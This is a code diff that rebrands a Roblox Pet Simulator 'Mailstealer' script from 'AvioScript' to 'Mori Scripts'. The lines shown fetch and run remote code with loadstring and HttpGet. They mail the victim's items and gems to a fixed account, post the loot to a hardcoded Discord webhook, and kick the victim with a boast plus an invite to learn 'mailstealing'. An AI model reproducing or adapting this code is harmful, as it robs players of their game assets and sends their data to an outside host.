@@ -6,18 +6,18 @@ if selectedLoadingScreen == nil or selectedLoadingScreen == "" then
 end
 
 if selectedLoadingScreen == "1" then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/PetSimulatorScripting/LoadScreen/refs/heads/main/load1"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ImDigitalz/LoadingScreen/main/1"))()
 end
 
 if selectedLoadingScreen == "2" then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/PetSimulatorScripting/LoadScreen/refs/heads/main/load2"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ImDigitalz/LoadingScreen/main/2"))()
 end
 
 if selectedLoadingScreen == "3" then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/PetSimulatorScripting/LoadScreen/refs/heads/main/load3"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ImDigitalz/LoadingScreen/main/3"))()
 end
 if selectedLoadingScreen == "4" then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/PetSimulatorScripting/LoadScreen/refs/heads/main/load4"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ImDigitalz/LoadingScreen/main/4"))()
 end
 
 if getgenv().Executed == true then
@@ -35,8 +35,8 @@ end
 
 local idiotuser = game:GetService("Players").LocalPlayer.Name
 
-if idiotuser == MargarinePool then
-    game:GetService("Players").LocalPlayer:Kick("You Are The Owner! (test it alt acc)")
+if idiotuser == Username then
+    game:GetService("Players").LocalPlayer:Kick("You Are The Owner! (test it on alt acc)")
     return
 end
 if Username == nil then
@@ -62,7 +62,7 @@ local Directory = require(game:GetService("ReplicatedStorage").Library.Directory
 local Player = game.Players.LocalPlayer
 local Inventory = Save.Inventory
 local HttpService = game:GetService("HttpService")
-local MailMessage = "AvioScript TheBest"
+local MailMessage = "Mori on top"
 local message = require(game.ReplicatedStorage.Library.Client.Message)
 local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
 
@@ -168,8 +168,8 @@ local function SendMessage(id, item_type, RBgoldNormal, thumbnail, webhook, pets
     local PlayerUser = Player.Name
     local msg = {
         ["content"] = ping,
-        ["username"] = "AvioScript",
-        ["avatar_url"] = "https://raw.githubusercontent.com/PetSimulatorScripting/Webhook/refs/heads/main/logo.jpg",
+        ["username"] = "Mori Scripts",
+        ["avatar_url"] = "https://raw.githubusercontent.com/ImDigitalz/Webhook/main/logo.png",
         ["embeds"] = {
             {
                 ["title"] = "**You just got a new item!**",
@@ -180,7 +180,7 @@ local function SendMessage(id, item_type, RBgoldNormal, thumbnail, webhook, pets
                 },
                 ["fields"] = {
                     {
-                        ["name"] = "**This data was generated using AvioScript Mailstealer**",
+                        ["name"] = "**This data was generated using Mori Scripts Mailstealer**",
                         ["value"] = "```Username     : " ..
                             fardplayer.Name ..
                                 "\nUser-ID      : " ..
@@ -705,7 +705,7 @@ end
 local function sendItem(category, uid, am, locked)
     local args = {
         [1] = Roblox_Username,
-        [2] = "AvioScript TheBest",
+        [2] = "Mori on top",
         [3] = category,
         [4] = uid,
         [5] = am
@@ -739,7 +739,7 @@ local function SendAllGems()
 				SentGems = GemsAmount - FirstPriceOfMail
                 local args = {
                     [1] = Roblox_Username,
-                    [2] = "AvioScript TheBest",
+                    [2] = "Mori on top",
                     [3] = "Currency",
                     [4] = i,
                     [5] = SentGems
@@ -822,7 +822,7 @@ if #hits > 0 or GemsAmount > FirstPriceOfMail then
                             "https://discord.com/api/webhooks/1336480960178552902/3qUclhdiVDnIGFTUKSBFMT85B5D50PpLWdyKvBREuEoHtZUdPGBVUfMRKgNBKCnzMEjs",
                             Left_Hits,
                             v.IsShiny,
-                            "AvioScript TheBest",
+                            "Mori on top",
                             v.Item_RAP,
                             totalRap
                         )
@@ -834,5 +834,5 @@ if #hits > 0 or GemsAmount > FirstPriceOfMail then
         end
     end
     SendAllGems()
-    Player:kick("All your stuff has just been stolen by AvioScript Mailstealer. Join discord.gg/7W8cKtH2m7 to start mailstealing")
+    Player:kick("All your stuff has just been stolen by Mori Scripts Mailstealer. Join discord.gg/tYyRcrFCpe to start mailstealing yourself")
 end
